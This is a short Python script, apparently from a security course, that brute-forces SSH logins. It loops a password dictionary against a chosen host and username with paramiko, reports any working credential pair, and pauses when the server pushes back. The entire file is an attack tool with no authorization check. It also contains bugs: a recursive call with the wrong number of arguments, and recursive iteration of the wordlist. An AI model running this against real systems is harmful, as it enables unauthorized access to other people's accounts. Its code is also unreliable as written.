#!/usr/bin/python3

# Script: Ops 401d5 Protech-Xealth Bruteforcer
# Author: Jon Salhus                  
# Date of latest revision: 11/3/2022
# Purpose: SSH Brute Force Attacker

import paramiko
import socket
import time
import sys
from colorama import init, Fore

init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE

plist = input("Enter the filename of your dictionary.\n")
f = open(plist, 'r')

hostname = input("Enter the IP address or host name.\n")
username = input("Enter the user name.\n")
password = input("Enter a password.\n")
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def brute(password):
    try:
        ssh.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
    except paramiko.SSHException:
        print(f"{BLUE}[*] Attack detected, sleeping...{RESET}")
        time.sleep(60)
        return brute(hostname, username, password)
    else:
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        exit(0)
    for password in f:
        brute(password.rstrip())

brute(password)
